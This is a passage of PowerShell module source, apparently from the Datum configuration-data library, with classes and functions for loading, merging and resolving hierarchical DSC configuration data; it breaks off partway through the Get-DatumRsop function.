#Region './Classes/1.DatumProvider.ps1' 0
class DatumProvider {
    hidden [bool]$IsDatumProvider = $true

    [hashtable]ToHashTable() {
        $result = ConvertTo-Datum -InputObject $this
        return $result
    }

    [System.Collections.Specialized.OrderedDictionary]ToOrderedHashTable() {
        $result = ConvertTo-Datum -InputObject $this
        return $result
    }
}
#EndRegion './Classes/1.DatumProvider.ps1' 17
#Region './Classes/FileProvider.ps1' 0
class FileProvider : DatumProvider {
    hidden [string]$Path
    hidden [hashtable] $Store
    hidden [hashtable] $DatumHierarchyDefinition
    hidden [hashtable] $StoreOptions
    hidden [hashtable] $DatumHandlers
    hidden [string] $Encoding

    FileProvider ($Path, $Store, $DatumHierarchyDefinition, $Encoding) {
        $this.Store = $Store
        $this.DatumHierarchyDefinition = $DatumHierarchyDefinition
        $this.StoreOptions = $Store.StoreOptions
        $this.Path = Get-Item $Path -ErrorAction SilentlyContinue
        $this.DatumHandlers = $DatumHierarchyDefinition.DatumHandlers
        $this.Encoding = $Encoding

        $result = Get-ChildItem -Path $path | ForEach-Object {
            if ($_.PSIsContainer) {
                $val = [scriptblock]::Create("New-DatumFileProvider -Path `"$($_.FullName)`" -Store `$this.DataOptions -DatumHierarchyDefinition `$this.DatumHierarchyDefinition -Encoding `$this.Encoding")
                $this | Add-Member -MemberType ScriptProperty -Name $_.BaseName -Value $val
            }
            else {
                $val = [scriptblock]::Create("Get-FileProviderData -Path `"$($_.FullName)`" -DatumHandlers `$this.DatumHandlers -Encoding `$this.Encoding")
                $this | Add-Member -MemberType ScriptProperty -Name $_.BaseName -Value $val
            }
        }
    }
}
#EndRegion './Classes/FileProvider.ps1' 33
#Region './Classes/Node.ps1' 0
class Node : hashtable {
    Node([hashtable]$NodeData) {
        $NodeData.Keys | ForEach-Object {
            $this[$_] = $NodeData[$_]
        }

        $this | Add-Member -MemberType ScriptProperty -Name Roles -Value {
            $pathArray = $ExecutionContext.InvokeCommand.InvokeScript('Get-PSCallStack')[2].Position.Text -split '\.'
            $propertyPath = $pathArray[2..($pathArray.Count - 1)] -join '\'
            Write-Warning -Message "Resolve $propertyPath"

            $obj = [PSCustomObject]@{}
            $currentNode = $obj
            if ($pathArray.Count -gt 3) {
                foreach ($property in $pathArray[2..($pathArray.count - 2)]) {
                    Write-Debug -Message "Adding $Property property"
                    $currentNode | Add-Member -MemberType NoteProperty -Name $property -Value ([PSCustomObject]@{})
                    $currentNode = $currentNode.$property
                }
            }
            Write-Debug -Message "Adding Resolved property to last object's property $($pathArray[-1])"
            $currentNode | Add-Member -MemberType NoteProperty -Name $pathArray[-1] -Value $propertyPath

            return $obj
        }
    }
    static ResolveDscProperty($Path) {
        "Resolve-DscProperty -DefaultValue $Path"
    }
}
#EndRegion './Classes/Node.ps1' 36
#Region './Private/Compare-Hashtable.ps1' 0
function Compare-Hashtable {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [hashtable]
        $ReferenceHashtable,

        [Parameter(Mandatory = $true)]
        [hashtable]
        $DifferenceHashtable,

        [Parameter()]
        [string[]]
        $Property = ($ReferenceHashtable.Keys + $DifferenceHashtable.Keys | Select-Object -Unique)
    )

    Write-Debug -Message "Compare-Hashtable -Ref @{$($ReferenceHashtable.keys -join ';')} -Diff @{$($DifferenceHashtable.keys -join ';')} -Property [$($Property -join ', ')]"
    #Write-Debug -Message "REF:`r`n$($ReferenceHashtable | ConvertTo-Json)"
    #Write-Debug -Message "DIFF:`r`n$($DifferenceHashtable | ConvertTo-Json)"

    foreach ($propertyName in $Property) {
        Write-Debug -Message "  Testing <$propertyName>'s value"
        if (($inRef = $ReferenceHashtable.Contains($propertyName)) -and
            ($inDiff = $DifferenceHashtable.Contains($propertyName))) {
            if ($ReferenceHashtable[$propertyName] -as [hashtable[]] -or $DifferenceHashtable[$propertyName] -as [hashtable[]]) {
                if ((Compare-Hashtable -ReferenceHashtable $ReferenceHashtable[$propertyName] -DifferenceHashtable $DifferenceHashtable[$propertyName])) {
                    Write-Debug -Message "  Skipping $propertyName...."
                    # If Compae returns something, they're not the same
                    continue
                }
            }
            else {
                Write-Debug -Message "Comparing: $($ReferenceHashtable[$propertyName]) With $($DifferenceHashtable[$propertyName])"
                if ($ReferenceHashtable[$propertyName] -ne $DifferenceHashtable[$propertyName]) {
                    [PSCustomObject]@{
                        SideIndicator = '<='
                        PropertyName  = $propertyName
                        Value         = $ReferenceHashtable[$propertyName]
                    }

                    [PSCustomObject]@{
                        SideIndicator = '=>'
                        PropertyName  = $propertyName
                        Value         = $DifferenceHashtable[$propertyName]
                    }
                }
            }
        }
        else {
            Write-Debug -Message "  Property $propertyName Not in one Side: Ref: [$($ReferenceHashtable.Keys -join ',')] | [$($DifferenceHashtable.Keys -join ',')]"
            if ($inRef) {
                Write-Debug -Message "$propertyName found in Reference hashtable"
                [PSCustomObject]@{
                    SideIndicator = '<='
                    PropertyName  = $propertyName
                    Value         = $ReferenceHashtable[$propertyName]
                }
            }
            else {
                Write-Debug -Message "$propertyName found in Difference hashtable"
                [PSCustomObject]@{
                    SideIndicator = '=>'
                    PropertyName  = $propertyName
                    Value         = $DifferenceHashtable[$propertyName]
                }
            }
        }
    }

}
#EndRegion './Private/Compare-Hashtable.ps1' 81
#Region './Private/Copy-Object.ps1' 0
function Copy-Object {
    <#
    .SYNOPSIS
        Creates a real copy of an object recursive including all the referenced objects it points to.

    .DESCRIPTION

        In .net reference types (classes), cannot be copied easily. If a type implements the IClonable interface it can be copied
        or cloned but the objects it references to will not be cloned. Rather the reference is cloned like shown in this example:

        $a = @{
            k1 = 'v1'
            k2 = @{
                kk1 = 'vv1'
                kk2 = 'vv2'
            }
        }

        $b = @{}
        $validKeys = 'k1', 'k2'
        foreach ($validKey in $validKeys)
        {
            if ($a.ContainsKey($validKey))
            {
                $b.Add($validKey, $a.Item($validKey))
            }
        }

        Write-Host '-------- Before removal of kk2 -------------'
        Write-Host "Key count of a.k2: $($a.k2.Keys.Count)"
        Write-Host "Key count in b.k2: $($b.k2.Keys.Count)"

        $b.k2.Remove('kk2')
        Write-Host '-------- After removal of kk2 --------------'
        Write-Host "Key count of a.k2: $($a.k2.Keys.Count)"
        Write-Host "Key count in b.k2: $($b.k2.Keys.Count)"


    .EXAMPLE
        PS C:\> $clonedObject = Copy-Object -DeepCopyObject $someObject

    .INPUTS
        It takes any kind of object as input which will be serialized and deserialized to create a copy.
        [object]

    .OUTPUTS
        [Deserialized.<object>]

    #>

    param (
        [Parameter(Mandatory = $true)]
        [object]
        $DeepCopyObject
    )

    $serialData = [System.Management.Automation.PSSerializer]::Serialize($DeepCopyObject)
    [System.Management.Automation.PSSerializer]::Deserialize($serialData)
}
#EndRegion './Private/Copy-Object.ps1' 61
#Region './Private/Expand-RsopHashtable.ps1' 0
function Expand-RsopHashtable {
    param (
        [Parameter()]
        [object]
        $InputObject,

        [Parameter()]
        [switch]
        $IsArrayValue,

        [Parameter()]
        [int]
        $Depth,

        [Parameter()]
        [switch]
        $AddSourceInformation
    )

    $Depth++

    if ($null -eq $InputObject) {
        return $null
    }

    if ($InputObject -is [System.Collections.IDictionary]) {
        $newObject = @{}
        $keys = [string[]]$InputObject.Keys
        foreach ($key in $keys) {
            $newObject.$key = Expand-RsopHashtable -InputObject $InputObject[$key] -Depth $Depth -AddSourceInformation:$AddSourceInformation
        }

        [ordered]@{} + $newObject
    }
    elseif ($InputObject -is [System.Collections.IList]) {
        $doesUseYamlArraySyntax = [bool]($InputObject.Count - 1)
        if (-not $doesUseYamlArraySyntax) {
            $depth--
        }
        $items = foreach ($item in $InputObject) {
            Expand-RsopHashtable -InputObject $item -IsArrayValue:$doesUseYamlArraySyntax -Depth $Depth -AddSourceInformation:$AddSourceInformation
        }
        $items
    }
    elseif ($InputObject -is [pscredential]) {
        $cred = $InputObject.GetNetworkCredential()
        $cred = "$($cred.UserName)@$($cred.Domain)$(if($cred.Domain){':'})$('*' * $cred.Password.Length)" | Add-Member -Name __File -MemberType NoteProperty -Value $InputObject.__File -PassThru

        Get-RsopValueString -InputString $cred -Key $key -Depth $depth -IsArrayValue:$IsArrayValue -AddSourceInformation:$AddSourceInformation
    }
    else {
        Get-RsopValueString -InputString $InputObject -Key $key -Depth $depth -IsArrayValue:$IsArrayValue -AddSourceInformation:$AddSourceInformation
    }
}
#EndRegion './Private/Expand-RsopHashtable.ps1' 64
#Region './Private/Get-DatumType.ps1' 0
function Get-DatumType {
    [OutputType([string])]
    param (
        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [object]
        $DatumObject
    )

    if ($DatumObject -is [hashtable] -or $DatumObject -is [System.Collections.Specialized.OrderedDictionary]) {
        'hashtable'
    }
    elseif ($DatumObject -isnot [string] -and $DatumObject -is [System.Collections.IEnumerable]) {
        if ($DatumObject -as [hashtable[]]) {
            'hash_array'
        }
        else {
            'baseType_array'
        }
    }
    else {
        'baseType'
    }

}
#EndRegion './Private/Get-DatumType.ps1' 32
#Region './Private/Get-MergeStrategyFromString.ps1' 0
function Get-MergeStrategyFromString {
    [CmdletBinding()]
    [OutputType([hashtable])]
    param (
        [Parameter()]
        [string]
        $MergeStrategy
    )

    <#
    MergeStrategy: MostSpecific
            merge_hash: MostSpecific
            merge_baseType_array: MostSpecific
            merge_hash_array: MostSpecific

    MergeStrategy: hash
            merge_hash: hash
            merge_baseType_array: MostSpecific
            merge_hash_array: MostSpecific
            merge_options:
            knockout_prefix: --

    MergeStrategy: Deep
            merge_hash: deep
            merge_baseType_array: Unique
            merge_hash_array: DeepTuple
            merge_options:
            knockout_prefix: --
            Tuple_Keys:
                - Name
                - Version
    #>

    Write-Debug -Message "Get-MergeStrategyFromString -MergeStrategy <$MergeStrategy>"
    switch -regex ($MergeStrategy) {
        '^First$|^MostSpecific$' {
            @{
                merge_hash           = 'MostSpecific'
                merge_baseType_array = 'MostSpecific'
                merge_hash_array     = 'MostSpecific'
            }
        }

        '^hash$|^MergeTopKeys$' {
            @{
                merge_hash           = 'hash'
                merge_baseType_array = 'MostSpecific'
                merge_hash_array     = 'MostSpecific'
                merge_options        = @{
                    knockout_prefix = '--'
                }
            }
        }

        '^deep$|^MergeRecursively$' {
            @{
                merge_hash           = 'deep'
                merge_baseType_array = 'Unique'
                merge_hash_array     = 'DeepTuple'
                merge_options        = @{
                    knockout_prefix = '--'
                    tuple_keys      = @(
                        'Name',
                        'Version'
                    )
                }
            }
        }
        default {
            Write-Debug -Message "Couldn't Match the strategy $MergeStrategy"
            @{
                merge_hash           = 'MostSpecific'
                merge_baseType_array = 'MostSpecific'
                merge_hash_array     = 'MostSpecific'
            }
        }
    }

}
#EndRegion './Private/Get-MergeStrategyFromString.ps1' 86
#Region './Private/Get-RsopValueString.ps1' 0
function Get-RsopValueString {
    param (
        [Parameter(Mandatory = $true)]
        [object]
        $InputString,

        [Parameter(Mandatory = $true)]
        [string]
        $Key,

        [Parameter()]
        [int]$Depth,

        [Parameter()]
        [switch]$IsArrayValue,

        [Parameter()]
        [switch]
        $AddSourceInformation
    )

    if (-not $AddSourceInformation) {
        $InputString.psobject.BaseObject
    }
    else {
        $fileInfo = (Get-DatumSourceFile -Path $InputString.__File)

        $i = if ($env:DatumRsopIndentation) {
            $env:DatumRsopIndentation
        }
        else {
            120
        }

        $i = if ($IsArrayValue) {
            $Depth--
            $i - ("$InputString".Length)
        }
        else {
            $i - ($Key.Length + "$InputString".Length)
        }

        $i -= [System.Math]::Max(0, ($depth) * 2)
        "{0}$(if ($fileInfo) { ""{1, $i}""  })" -f $InputString, $fileInfo
    }
}
#EndRegion './Private/Get-RsopValueString.ps1' 54
#Region './Private/Invoke-DatumHandler.ps1' 0
function Invoke-DatumHandler {
    <#
    .SYNOPSIS
        Invokes the configured datum handlers.

    .DESCRIPTION
        This function goes through all datum handlers configured in the 'datum.yml'. For all handlers, it calls the test function
        first that identifies if the particular handler should be invoked at all for the given InputString. The test function
        look for a prefix and suffix in orer to know if a handler should be called. For the handler 'Datum.InvokeCommand' the
        prefix is '[x=' and the siffix '=]'.

        Let's assume the handler is defined in a module named 'Datum.InvokeCommand'. The handler is introduced in the 'datum.yml'
        like this:

        DatumHandlers:
            Datum.InvokeCommand::InvokeCommand:
                SkipDuringLoad: true

        The name of the function that checks if the handler should be called is constructed like this:

            <FilterModuleName>\Test-<FilterName>Filter

        Considering the definition in the 'datum.yml', the actual function name will be:

            Datum.InvokeCommand\Test-InvokeCommandFilter

        Same rule applies for the action function that is actually the handler. Datum searches a function with the name

            <FilterModuleName>\Invoke-<FilterName>Action

        which will be in case of the filter module named 'Datum.InvokeCommand' and the filter name 'InvokeCommand':

            Datum.InvokeCommand\Invoke-InvokeCommandAction

    .EXAMPLE
        This sample calls the handlers defined in the 'Datum.yml' on the value  '[x= { Get-Date } =]'. Only a handler will
        be invoked that has the prefix '[x=' and the siffix '=]'.

        PS C:\> $d = New-DatumStructure -DefinitionFile .\tests\Integration\assets\DscWorkshopConfigData\Datum.yml
        PS C:\> $result = $nul
        PS C:\> Invoke-DatumHandler -InputObject '[x= { Get-Date } =]' -DatumHandlers $d.__Definition.DatumHandlers -Result ([ref]$result)
        PS C:\> $result #-> Thursday, March 24, 2022 1:54:51 AM

    .INPUTS
        [object]

    .OUTPUTS
        Whatever the datum handler returns.

    .NOTES

    #>

    param (
        [Parameter(Mandatory = $true)]
        [object]
        $InputObject,

        [Parameter()]
        [AllowNull()]
        [hashtable]
        $DatumHandlers,

        [Parameter()]
        [ref]$Result
    )

    $return = $false

    foreach ($handler in $DatumHandlers.Keys) {
        if ($DatumHandlers.$handler.SkipDuringLoad -and (Get-PSCallStack).Command -contains 'Get-FileProviderData') {
            continue
        }

        $filterModule, $filterName = $handler -split '::'
        if (-not (Get-Module $filterModule)) {
            Import-Module $filterModule -Force -ErrorAction Stop
        }

        $filterCommand = Get-Command -ErrorAction SilentlyContinue ('{0}\Test-{1}Filter' -f $filterModule, $filterName)
        if ($filterCommand -and ($InputObject | &$filterCommand)) {
            try {
                if ($actionCommand = Get-Command -Name ('{0}\Invoke-{1}Action' -f $filterModule, $filterName) -ErrorAction SilentlyContinue) {
                    $actionParams = @{}
                    $commandOptions = $DatumHandlers.$handler.CommandOptions.Keys

                    # Populate the Command's params with what's in the Datum.yml, or from variables
                    $variables = Get-Variable
                    foreach ($paramName in $actionCommand.Parameters.Keys) {
                        if ($paramName -in $commandOptions) {
                            $actionParams.Add($paramName, $DatumHandlers.$handler.CommandOptions[$paramName])
                        }
                        elseif ($var = $Variables.Where{ $_.Name -eq $paramName }) {
                            $actionParams."$paramName" = $var[0].Value
                        }
                    }
                    $internalResult = (&$actionCommand @actionParams)
                    if ($null -eq $internalResult) {
                        $Result.Value = [string]::Empty
                    }

                    $Result.Value = $internalResult
                    return $true
                }
            }
            catch {
                #If true, datum handlers throwing errors will stop the whole compilation process. This is usually wanted to make sure
                #that the datum handlers are working as expected and your data / RSOP does not contain invalid or incomplete data.
                $throwOnError = [bool]$datum.__Definition.DatumHandlersThrowOnError

                if ($throwOnError) {
                    Write-Error -ErrorRecord $_ -ErrorAction Stop
                }
                else {
                    Write-Warning "Error using Datum Handler '$Handler', the error was: '$($_.Exception.Message)'. Returning InputObject ($InputObject)."
                    $Result = $InputObject
                    return $false
                }
            }
        }
    }

    return $return
}
#EndRegion './Private/Invoke-DatumHandler.ps1' 139
#Region './Private/Merge-DatumArray.ps1' 0
function Merge-DatumArray {
    [OutputType([System.Collections.ArrayList])]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [object]
        $ReferenceArray,

        [Parameter(Mandatory = $true)]
        [object]
        $DifferenceArray,

        [Parameter()]
        [hashtable]
        $Strategy = @{},

        [Parameter()]
        [hashtable]
        $ChildStrategies = @{
            '^.*' = $Strategy
        },

        [Parameter(Mandatory = $true)]
        [string]
        $StartingPath
    )

    Write-Debug -Message "`tMerge-DatumArray -StartingPath <$StartingPath>"
    $knockout_prefix = [regex]::Escape($Strategy.merge_options.knockout_prefix).Insert(0, '^')
    $hashArrayStrategy = $Strategy.merge_hash_array
    Write-Debug -Message "`t`tHash Array Strategy: $hashArrayStrategy"
    $mergeBasetypeArraysStrategy = $Strategy.merge_basetype_array
    $mergedArray = [System.Collections.ArrayList]::new()

    $sortParams = @{}
    if ($propertyNames = [string[]]$Strategy.merge_options.tuple_keys) {
        $sortParams.Add('Property', $propertyNames)
    }

    if ($ReferenceArray -as [hashtable[]]) {
        Write-Debug -Message "`t`tMERGING Array of Hashtables"
        if (-not $hashArrayStrategy -or $hashArrayStrategy -match 'MostSpecific') {
            Write-Debug -Message "`t`tMerge_hash_arrays Disabled. value: $hashArrayStrategy"
            $mergedArray = $ReferenceArray
            if ($Strategy.sort_merged_arrays) {
                $mergedArray = $mergedArray | Sort-Object @sortParams
            }
            return $mergedArray
        }

        switch -Regex ($hashArrayStrategy) {
            '^Sum|^Add' {
                (@($DifferenceArray) + @($ReferenceArray)) | ForEach-Object {
                    $null = $mergedArray.Add(([ordered]@{} + $_))
                }
            }

            # MergeHashesByProperties
            '^Deep|^Merge' {
                Write-Debug -Message "`t`t`tStrategy for Array Items: Merge Hash By tuple`r`n"
                # look at each $RefItems in $RefArray
                #   if no PropertyNames defined, use all Properties of $RefItem
                #   else use defined propertyNames
                #  Search for DiffItem that has the same Property/Value pairs
                #    if found, Merge-Datum (or MergeHashtable?)
                #    if not found, add $DiffItem to $RefArray

                # look at each $RefItems in $RefArray
                $usedDiffItems = [System.Collections.ArrayList]::new()
                foreach ($referenceItem in $ReferenceArray) {
                    $referenceItem = [ordered]@{} + $referenceItem
                    Write-Debug -Message "`t`t`t  .. Working on Merged Element $($mergedArray.Count)`r`n"
                    # if no PropertyNames defined, use all Properties of $RefItem
                    if (-not $propertyNames) {
                        Write-Debug -Message "`t`t`t ..No PropertyName defined: Use ReferenceItem Keys"
                        $propertyNames = $referenceItem.Keys
                    }
                    $mergedItem = @{} + $referenceItem
                    $diffItemsToMerge = $DifferenceArray.Where{
                        $differenceItem = [ordered]@{} + $_
                        # Search for DiffItem that has the same Property/Value pairs than RefItem
                        $compareHashParams = @{
                            ReferenceHashtable  = [ordered]@{} + $referenceItem
                            DifferenceHashtable = $differenceItem
                            Property            = $propertyNames
                        }
                        (-not (Compare-Hashtable @compareHashParams))
                    }
                    Write-Debug -Message "`t`t`t ..Items to merge: $($diffItemsToMerge.Count)"
                    $diffItemsToMerge | ForEach-Object {
                        $mergeItemsParams = @{
                            ParentPath          = $StartingPath
                            Strategy            = $Strategy
                            ReferenceHashtable  = $mergedItem
                            DifferenceHashtable = $_
                            ChildStrategies     = $ChildStrategies
                        }
                        $mergedItem = Merge-Hashtable @mergeItemsParams
                    }
                    # If a diff Item has been used, save it to find the unused ones
                    $null = $usedDiffItems.AddRange($diffItemsToMerge)
                    $null = $mergedArray.Add($mergedItem)
                }
                $unMergedItems = $DifferenceArray | ForEach-Object {
                    if (-not $usedDiffItems.Contains($_)) {
                        ([ordered]@{} + $_)
                    }
                }
                if ($null -ne $unMergedItems) {
                    if ($unMergedItems -is [System.Array]) {
                        $null = $mergedArray.AddRange($unMergedItems)
                    }
                    else {
                        $null = $mergedArray.Add($unMergedItems)
                    }
                }
            }

            # UniqueByProperties
            '^Unique' {
                Write-Debug -Message "`t`t`tSelecting Unique Hashes accross both arrays based on Property tuples"
                # look at each $DiffItems in $DiffArray
                #   if no PropertyNames defined, use all Properties of $DiffItem
                #   else use defined PropertyNames
                #  Search for a RefItem that has the same Property/Value pairs
                #  if Nothing is found
                #    add current DiffItem to RefArray

                if (-not $propertyNames) {
                    Write-Debug -Message "`t`t`t ..No PropertyName defined: Use ReferenceItem Keys"
                    $propertyNames = $referenceItem.Keys
                }

                $mergedArray = [System.Collections.ArrayList]::new()
                $ReferenceArray | ForEach-Object {
                    $currentRefItem = $_
                    if (-not ($mergedArray.Where{ -not (Compare-Hashtable -Property $propertyNames -ReferenceHashtable $currentRefItem -DifferenceHashtable $_ ) })) {
                        $null = $mergedArray.Add(([ordered]@{} + $_))
                    }
                }

                $DifferenceArray | ForEach-Object {
                    $currentDiffItem = $_
                    if (-not ($mergedArray.Where{ -not (Compare-Hashtable -Property $propertyNames -ReferenceHashtable $currentDiffItem -DifferenceHashtable $_ ) })) {
                        $null = $mergedArray.Add(([ordered]@{} + $_))
                    }
                }
            }
        }
    }

    $mergedArray
}
#EndRegion './Private/Merge-DatumArray.ps1' 172
#Region './Private/Merge-Hashtable.ps1' 0
function Merge-Hashtable {
    [OutputType([hashtable])]
    [CmdletBinding()]
    param (
        # [hashtable] These should stay ordered
        [Parameter(Mandatory = $true)]
        [object]
        $ReferenceHashtable,

        # [hashtable] These should stay ordered
        [Parameter(Mandatory = $true)]
        [object]
        $DifferenceHashtable,

        [Parameter()]
        $Strategy = @{
            merge_hash           = 'hash'
            merge_baseType_array = 'MostSpecific'
            merge_hash_array     = 'MostSpecific'
            merge_options        = @{
                knockout_prefix = '--'
            }
        },

        [Parameter()]
        [hashtable]
        $ChildStrategies = @{},

        [Parameter()]
        [string]
        $ParentPath
    )

    Write-Debug -Message "`tMerge-Hashtable -ParentPath <$ParentPath>"

    # Removing Case Sensitivity while keeping ordering
    $ReferenceHashtable = [ordered]@{} + $ReferenceHashtable
    $DifferenceHashtable = [ordered]@{} + $DifferenceHashtable
    $clonedReference = [ordered]@{} + $ReferenceHashtable

    if ($Strategy.merge_options.knockout_prefix) {
        $knockoutPrefix = $Strategy.merge_options.knockout_prefix
        $knockoutPrefixMatcher = [regex]::Escape($knockoutPrefix).Insert(0, '^')
    }
    else {
        $knockoutPrefixMatcher = [regex]::Escape('--').insert(0, '^')
    }
    Write-Debug -Message "`t  Knockout Prefix Matcher: $knockoutPrefixMatcher"

    $knockedOutKeys = $ReferenceHashtable.Keys.Where{ $_ -match $knockoutPrefixMatcher }.ForEach{ $_ -replace $knockoutPrefixMatcher }
    Write-Debug -Message "`t  Knockedout Keys: [$($knockedOutKeys -join ', ')] from reference Hashtable Keys [$($ReferenceHashtable.keys -join ', ')]"

    foreach ($currentKey in $DifferenceHashtable.keys) {
        Write-Debug -Message "`t  CurrentKey: $currentKey"
        if ($currentKey -in $knockedOutKeys) {
            Write-Debug -Message "`t`tThe Key $currentkey is knocked out from the reference Hashtable."
        }
        elseif ($currentKey -match $knockoutPrefixMatcher -and -not $ReferenceHashtable.Contains(($currentKey -replace $knockoutPrefixMatcher))) {
            # it's a knockout coming from a lower level key, it should only apply down from here
            Write-Debug -Message "`t`tKnockout prefix found for $currentKey in Difference hashtable, and key not set in Reference hashtable"
            if (-not $ReferenceHashtable.Contains($currentKey)) {
                Write-Debug -Message "`t`t..adding knockout prefixed key for $curretKey to block further merges"
                $clonedReference.Add($currentKey, $null)
            }
        }
        elseif (-not $ReferenceHashtable.Contains($currentKey) ) {
            #if the key does not exist in reference ht, create it using the DiffHt's value
            Write-Debug -Message "`t    Added Missing Key $currentKey of value: $($DifferenceHashtable[$currentKey]) from difference HT"
            $clonedReference.Add($currentKey, $DifferenceHashtable[$currentKey])
        }
        else {
            #the key exists, and it's not a knockout entry
            $refHashItemValueType = Get-DatumType -DatumObject $ReferenceHashtable[$currentKey]
            $diffHashItemValueType = Get-DatumType -DatumObject $DifferenceHashtable[$currentKey]
            Write-Debug -Message "for Key $currentKey REF:[$refHashItemValueType] | DIFF:[$diffHashItemValueType]"
            if ($ParentPath) {
                $childPath = Join-Path -Path $ParentPath -ChildPath $currentKey
            }
            else {
                $childPath = $currentKey
            }

            switch ($refHashItemValueType) {
                'hashtable' {
                    if ($Strategy.merge_hash -eq 'deep') {
                        Write-Debug -Message "`t`t .. Merging Datums at current path $childPath"
                        # if there's no Merge override for the subkey's path in the (not subkeys),
                        #   merge HASHTABLE with same strategy
                        # otherwise, merge Datum
                        $childStrategy = Get-MergeStrategyFromPath -Strategies $ChildStrategies -PropertyPath $childPath

                        if ($childStrategy.Default) {
                            Write-Debug -Message "`t`t ..Merging using the current Deep Strategy, Bypassing default"
                            $MergePerDefault = @{
                                ParentPath          = $childPath
                                Strategy            = $Strategy
                                ReferenceHashtable  = $ReferenceHashtable[$currentKey]
                                DifferenceHashtable = $DifferenceHashtable[$currentKey]
                                ChildStrategies     = $ChildStrategies
                            }
                            $subMerge = Merge-Hashtable @MergePerDefault
                        }
                        else {
                            Write-Debug -Message "`t`t ..Merging using Override Strategy $($childStrategy | ConvertTo-Json)"
                            $MergeDatumParam = @{
                                StartingPath    = $childPath
                                ReferenceDatum  = $ReferenceHashtable[$currentKey]
                                DifferenceDatum = $DifferenceHashtable[$currentKey]
                                Strategies      = $ChildStrategies
                            }
                            $subMerge = Merge-Datum @MergeDatumParam
                        }
                        Write-Debug -Message "`t  # Submerge $($submerge|ConvertTo-Json)."
                        $clonedReference[$currentKey] = $subMerge
                    }
                }

                'baseType' {
                    #do nothing to use most specific value (quicker than default)
                }

                # Default used for hash_array, baseType_array
                default {
                    Write-Debug -Message "`t  .. Merging Datums at current path $childPath`r`n$($Strategy | ConvertTo-Json)"
                    $MergeDatumParams = @{
                        StartingPath    = $childPath
                        Strategies      = $ChildStrategies
                        ReferenceDatum  = $ReferenceHashtable[$currentKey]
                        DifferenceDatum = $DifferenceHashtable[$currentKey]
                    }

                    if ($clonedReference.$currentKey -is [System.Array]) {
                        [System.Array]$clonedReference[$currentKey] = Merge-Datum @MergeDatumParams
                    }
                    else {
                        $clonedReference[$currentKey] = Merge-Datum @MergeDatumParams
                    }
                    Write-Debug -Message "`t  .. Datum Merged for path $childPath"
                }
            }
        }
    }

    return $clonedReference
}
#EndRegion './Private/Merge-Hashtable.ps1' 166
#Region './Public/Clear-DatumRsopCache.ps1' 0
function Clear-DatumRsopCache {
    [CmdletBinding()]

    param ()

    if ($script:rsopCache.Count) {
        $script:rsopCache.Clear()
        Write-Verbose -Message 'Datum RSOP Cache cleared'
    }
}
#EndRegion './Public/Clear-DatumRsopCache.ps1' 13
#Region './Public/ConvertTo-Datum.ps1' 0
function ConvertTo-Datum {
    param (
        [Parameter(ValueFromPipeline = $true)]
        [object]
        $InputObject,

        [Parameter()]
        [AllowNull()]
        [hashtable]
        $DatumHandlers = @{}
    )

    process {
        $result = $null

        if ($null -eq $InputObject) {
            return $null
        }

        if ($InputObject -is [System.Collections.IDictionary]) {
            if (-not $file -and $InputObject.__File) {
                $file = $InputObject.__File
            }

            $hashKeys = [string[]]$InputObject.Keys
            foreach ($key in $hashKeys) {
                $InputObject[$key] = ConvertTo-Datum -InputObject $InputObject[$key] -DatumHandlers $DatumHandlers
            }
            # Making the Ordered Dict Case Insensitive
            ([ordered]@{} + $InputObject) | Add-Member -Name __File -MemberType NoteProperty -Value "$file" -PassThru -Force
        }
        elseif ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
            $collection = @(
                foreach ($object in $InputObject) {
                    if (-not $file -and $object.__File) {
                        $file = $object.__File
                    }
                    ConvertTo-Datum -InputObject $object -DatumHandlers $DatumHandlers
                }
            )

            , $collection
        }
        elseif (($InputObject -is [DatumProvider]) -and $InputObject -isnot [pscredential]) {
            if (-not $file -and $InputObject.__File) {
                $file = $InputObject.__File
            }

            $hash = [ordered]@{}

            foreach ($property in $InputObject.PSObject.Properties) {
                $hash[$property.Name] = ConvertTo-Datum -InputObject $property.Value -DatumHandlers $DatumHandlers | Add-Member -Name __File -MemberType NoteProperty -Value $File.FullName -PassThru -Force
            }

            $hash
        }
        # if there's a matching filter, process associated command and return result
        elseif ($DatumHandlers.Count -and (Invoke-DatumHandler -InputObject $InputObject -DatumHandlers $DatumHandlers -Result ([ref]$result))) {
            if (-not $file -and $InputObject.__File) {
                $file = $InputObject.__File
            }

            if ($result) {
                if (-not $result.__File -and $InputObject.__File) {
                    $result | Add-Member -Name __File -Value "$($InputObject.__File)" -MemberType NoteProperty -PassThru -Force
                }
                elseif (-not $result.__File -and $file) {
                    $result | Add-Member -Name __File -Value "$($file)" -MemberType NoteProperty -PassThru -Force
                }
                else {
                    $result
                }
            }
            else {
                Write-Verbose "Datum handlers for '$InputObject' returned '$null'"
                $null
            }
        }
        else {
            if (-not $file -and $InputObject.__File) {
                $file = $InputObject.__File
            }

            if ($file -and -not $InputObject.__File) {
                $InputObject | Add-Member -Name __File -Value "$file" -MemberType NoteProperty -PassThru -Force
            }
            else {
                $InputObject
            }
        }
    }
}
#EndRegion './Public/ConvertTo-Datum.ps1' 116
#Region './Public/Get-DatumRsop.ps1' 0
function Get-DatumRsop {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [hashtable]
        $Datum,

        [Parameter(Mandatory = $true)]
        [hashtable[]]
        $AllNodes,

        [Parameter()]
        [string]
        $CompositionKey = 'Configurations',

        [Parameter()]
        [scriptblock]
        $Filter = {},

        [Parameter()]
        [switch]
        $IgnoreCache,

        [Parameter()]
        [switch]
        $IncludeSource,

        [Parameter()]
        [switch]
        $RemoveSource
    )

    if (-not $script:rsopCache) {
        $script:rsopCache = @{}
    }

    if ($Filter.ToString() -ne ([System.Management.Automation.ScriptBlock]::Create( {})).ToString()) {
        Write-Verbose "Filter: $($Filter.ToString())"
        $AllNodes = [System.Collections.Hashtable[]]$AllNodes.Where($Filter)
        Write-Verbose "Node count after applying filter: $($AllNodes.Count)"
    }

    foreach ($node in $AllNodes) {
        if (-not $node.Name) {
            $node.Name = $node.NodeName
        }

        $null = $node | ConvertTo-Datum -DatumHandlers $Datum.__Definition.DatumHandlers

        if (-not $script:rsopCache.ContainsKey($node.Name) -or $IgnoreCache) {
            Write-Verbose "Key not found in the cache: '$($node.Name)'. Creating RSOP..."
            $rsopNode = $node.Clone()

            $configurations = Resolve-NodeProperty -PropertyPath $CompositionKey -Node $node -DatumTree $Datum -DefaultValue @()
